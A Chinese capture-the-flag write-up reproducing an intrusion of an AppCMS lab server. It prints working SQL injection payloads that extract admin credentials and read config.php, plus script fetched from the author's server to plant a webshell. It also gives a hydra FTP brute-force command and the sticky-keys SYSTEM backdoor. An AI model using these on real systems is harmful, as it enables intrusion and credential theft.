> 原文链接: https://www.anquanke.com//post/id/97567 


# 从一道高质量的ctf题中看渗透测试


                                阅读量   
                                **216860**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01084834b2d7ab4a22.jpg)](https://p1.ssl.qhimg.com/t01084834b2d7ab4a22.jpg)

> #Author:jaivy#

最近做了一道质量挺不错的ctf题，涉及web渗透、sql注入、csrf、权限提升等知识点，所以特地重新自己搭了个环境复现了一下这道高质量的ctf题分享给大家，并谈谈一些个人的感悟。

> 目录
0x01 初探
0x02 csrf“借刀杀人”
0x03爆破ftp密码
0x04 粘滞键提权留后门
0x05总结



## 0x01 初探

首先开始给出的是一个appcms 的网站，发现很多插件什么的功能都没有。

[![](https://p0.ssl.qhimg.com/t01f7db2684ed996349.png)](https://p0.ssl.qhimg.com/t01f7db2684ed996349.png)

拿到网站肯定先把关键字丢进搜索引擎里面搜索一波，最后发现了一个有用的信息

[![](https://p5.ssl.qhimg.com/t01dc703fdf57549d92.png)](https://p5.ssl.qhimg.com/t01dc703fdf57549d92.png)

这里说是comment.php存在sql注入

经过进一步搜索分析发现

该漏洞发生在comment.php文件的第79行，$fields[‘ip’]的值满足用户可控且数据未经过安全处理直接拼接传入SQL语句，造成了insert注入。

$fields[‘ip’]最终红传递到$sql_value变量中，然后拼接成下面的sql，而$fields[‘ip’]可由请求包中的client-ip字段的值来控制

[![](https://p5.ssl.qhimg.com/t0167031958f9968060.png)](https://p5.ssl.qhimg.com/t0167031958f9968060.png)

这样可能还不是很明显，不过大家可以下看下去，下面有说的执行payload的时候后台实际上执行的完整的sql语句是什么样子的。
- **这里先补充一个关于insert注入的知识点**
例如执行下列语句后相当于同时执行了两条插入语句。

```
insert into test1(id,name,pwd) values(5,'mmm','mmmpwd'),(6,'jjj','jjjpwd');
```

[![](https://p1.ssl.qhimg.com/t01a15018f2148e9b44.png)](https://p1.ssl.qhimg.com/t01a15018f2148e9b44.png)

正是由于mysql  中的这个特性导致了这里可以注入成功(可以允许使用逗号来分隔实现同时插入多条数据)

** **
- **下面构造payload获取管理员用户名密码**
存在sql注入漏洞的是在评论页面，例如

http://10.10.10.1/appcms/index.php?tpl=content_app&amp;id=1

[![](https://p4.ssl.qhimg.com/t01f680c4f2ed1388e9.png)](https://p4.ssl.qhimg.com/t01f680c4f2ed1388e9.png)



(因为appcms是开源的，数据库表中的一些情况我们可以通过直接下载源码自己搭建起来就能查看到,所以这里可以直接查询管理员用户名和密码)

在页面http://10.10.10.1/appcms/index.php?tpl=content_app&amp;id=1

提交评论、抓包，填写上payload

```
client-ip:2.2.2.2'),('1','0','0',(select upass from appcms_admin_list where uid='1'),(select uname from appcms_admin_list where uid='1'),'1511885595817',1)#)
```

[![](https://p4.ssl.qhimg.com/t01430cd7ce439a0005.png)](https://p4.ssl.qhimg.com/t01430cd7ce439a0005.png)

这里简单说明一下，当执行这个payload的时候，后台实际上执行的sql语句是这样的

```
insert into appcms_comment (id,type,parent_id,content,uname,date_add,ip) values ('1','0','0','testtttttt','test','1511885595817','2.2.2.2'),('1','0','0',(select upass from appcms_admin_list where uid='1'),(select uname from appcms_admin_list where uid='1'),'1511885595817',1)#)
```

[![](https://p2.ssl.qhimg.com/t01e95ce38897e039a6.png)](https://p2.ssl.qhimg.com/t01e95ce38897e039a6.png)

最后我们可以在评论页面看到注入出来的内容

[![](https://p1.ssl.qhimg.com/t015109250c6139a7cb.png)](https://p1.ssl.qhimg.com/t015109250c6139a7cb.png)

这里通过阅读appcms 的底层代码我们可以知道，这里这个密码是经过3次md5加密的，所以我们的解密过程就是经过3次md5解密(在一些md5网站上可以很容易解出来)
- **构造payload获取安全码**
要登进后台除了用户名、密码之外，还需要安全码

这里使用mysql的load_file()来读取\core\config.php文件，安全码等敏感信息就在该文件里面。

payload：

```
client-ip:1.1.1.1'),('1','0','0',(substr(load_file('d:\\phpStudy\\WWW\\appcms\\core\\config.php'),480,400)),'test','1511942803','11.11.11.11')#
```

[![](https://p0.ssl.qhimg.com/t012b75ec41c8c57ba1.png)](https://p0.ssl.qhimg.com/t012b75ec41c8c57ba1.png)

可以看到这里安全码被注入出来了是 666888

[![](https://p3.ssl.qhimg.com/t012891a2a5e9c3a374.png)](https://p3.ssl.qhimg.com/t012891a2a5e9c3a374.png)

一路走到这里都还算是比较顺利，一般来说，后面都是找后台，然后登陆进后台，但在这里就十分尴尬了，后面一直用各种方法，爆破、报错，都找不到后台到底在哪里，看来这里出题者是故意把后台路径隐藏得很深，或者是直接就把后台给删掉了。



## 0x02 csrf“借刀杀人”

一直到后面主办方给了一个tips:

“听说管理员每5分钟都会审核一次评论并且把评论都清空哦！”

这里提到了管理员会审核评论，有经验的人可能一下就反应过来了–csrf

这里我先是在自己的一台服务器上写好了getshell的js文件，然后再通过评论页面的sql注入把恶意的js代码插入进去

js文件  http://自己的服务器ip/getshell.js

[![](https://p5.ssl.qhimg.com/t01fc607d08d9d0ed98.png)](https://p5.ssl.qhimg.com/t01fc607d08d9d0ed98.png)

接着我们回到评论页面，发表评论，抓包,写上payload

[![](https://p5.ssl.qhimg.com/t01bee35a104d1dc7c1.png)](https://p5.ssl.qhimg.com/t01bee35a104d1dc7c1.png)

当管理员审核我们的评论的时候，就会触发上面的js，然后我们这个js脚本就会把一句话木马写入  templates/default/muma.php

五分钟之后我们检查一下，确实已经把一句话木马写进去了

[![](https://p2.ssl.qhimg.com/t0101974d2a97251b10.png)](https://p2.ssl.qhimg.com/t0101974d2a97251b10.png)

用菜刀连上去之后是这样的，发现权限特别低，想着估计是要提权，于是上了一些pr提权、巴西烤肉等常用的提权工具，试了一下，并没有提权成功

[![](https://p1.ssl.qhimg.com/t01fac15d12a10ec059.png)](https://p1.ssl.qhimg.com/t01fac15d12a10ec059.png)

## 0x03爆破ftp密码

后来才留意到这里有个 “大佬看过来.txt” 文件，于是打开看到如下内容

[![](https://p1.ssl.qhimg.com/t01f3e7cd5f9d38c0cc.png)](https://p1.ssl.qhimg.com/t01f3e7cd5f9d38c0cc.png)

这里提示了ftp用户名，猜测有可能是要通过ftp来提权，这里密码提示让我们猜猜看，于是想到了爆破，于是在kali下使用hydra进行ftp密码爆破尝试

爆破ftp的命令

hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -v

[![](https://p1.ssl.qhimg.com/t0195b3362cd74b4b1c.png)](https://p1.ssl.qhimg.com/t0195b3362cd74b4b1c.png)

最后爆破出来ftpuser的密码了，然后登陆进去发现果然是个高权限的用户，并且直接把但是我们只能看见一个c盘，所以我就使用粘滞键留后门的方法留了个后门，并上传了3389.exe开了它的3389 (这里出题的权限确实是有点高了~~)



## 0x04 粘滞键提权留后门

这里简单说一下粘滞键留后门

原理:win下连续按五次shift会调用c:\windows\system32\sethc.exe

在我们已经登录系统时，这个程序是以我们自己的用户权限运行的。

但是当我们未登陆系统(停留在登陆界面)的时候 系统还不知道我们将以哪个用户登陆,所以在这个时候连续按5次shift后门的话系统将会以system用户(比管理员更高级别的权限)来运行sethc.exe这个程序

cmd.exe的默认路径是c:\windows\system32\cmd.exe,所以这里如果我们把cmd.exe更名为sethc.exe,那么我们按下五次shift将会调用cmd窗口，由于是在未登录的状态下运行的，所以是个system权限的，所以就达到了提权的目的(可以进一步创建一个管理员权限的账户)

下面是具体操作，先是用ftp登录进去，然后打开c:\windows\system32\ 这个目录，找到sethc.exe,并把这个文件给移走，然后把c:\windows\system32\cmd.exe改名为 sethc.exe，如图

(这里需要有足够的权限才能进行这些操作，而这里恰恰就有足够的权限)

[![](https://p4.ssl.qhimg.com/t01758d9a5aa533f84e.png)](https://p4.ssl.qhimg.com/t01758d9a5aa533f84e.png)

[![](https://p2.ssl.qhimg.com/t010a300726758a1248.png)](https://p2.ssl.qhimg.com/t010a300726758a1248.png)



然后就是上传一个开3389.exe文件上去在webshell里面执行，然后就成功开启了服务器的3389了，或者使用一些bat命令来开启也是可以的

开了3389用远程桌面连接上去之后呢，打开了远程桌面连接的窗口之后，我们点击五次shift，就能打开一个dos窗口了，留意程序的文件名，这里调用的是sethc.exe也就是刚刚被我们用cmd.exe替换掉了的那个，所以这样我们就得到了一个高权限的shell了。我们可以自己创建一个用户，然后登陆进去查看

(当时好像使用的是win xp 我这里用的是win7，跟当时的情况会有点出入，不过懂这个意思就好了)

[![](https://p0.ssl.qhimg.com/t01ef42827e4a806249.png)](https://p0.ssl.qhimg.com/t01ef42827e4a806249.png)

[![](https://p2.ssl.qhimg.com/t01ba09832996ab90b8.png)](https://p2.ssl.qhimg.com/t01ba09832996ab90b8.png)

[![](https://p3.ssl.qhimg.com/t016f5fcbbdfffd1ef9.png)](https://p3.ssl.qhimg.com/t016f5fcbbdfffd1ef9.png)

登陆上去之后呢，发现在d盘根目录下终于看到了flag文件了。



## 0x05总结

这道ctf题涉及了大量的知识点，从web渗透到拿下服务器，从最开始的sql注入，注入出管理员账号密码，到后面利用csrf得到了一个低权限的shell，最后使用ftp提权、粘滞键留后门，3389登录进去拿到flag。

作为一个刚入门渗透测试不久的渣渣，本人一般看到一个web网站，通常都是先是会扫描一下这台服务器开放了一些什么服务、什么端口，看一下这个网站是用什么框架写的网站以及相关的版本信息，然后搜索一些公开的漏洞，尝试着去通过这些漏洞渗透进去。

对于这道ctf题，我们从拿到低权限的shell得到提示，到最后成功提权拿到flag，其实也正是如此。
